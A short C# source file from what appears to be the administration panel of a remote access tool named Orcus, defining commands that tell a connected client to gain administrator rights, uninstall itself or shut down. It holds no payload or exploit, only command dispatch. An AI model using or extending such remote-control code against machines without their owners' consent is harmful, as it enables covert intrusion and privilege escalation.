using System;
using Orcus.Shared.Commands.ClientAction;

namespace Orcus.Administration.App
{
	public class ClientActionCommand : Command
	{
		public override void ResponseReceived (byte[] parameter)
		{
			//ignored
		}

		public void MakeAdmin()
		{
			ConnectionInfo.SendCommand(this, new[] {(byte) ClientActionCommunication.MakeAdmin});
		}

		public void Uninstall()
		{
			ConnectionInfo.SendCommand(this, new[] {(byte) ClientActionCommunication.Uninstall});
		}

		public void Shutdown()
		{
			ConnectionInfo.SendCommand(this, new[] {(byte) ClientActionCommunication.Shutdown});
		}

		protected override uint GetId()
		{
			return 20;
		}
	}
}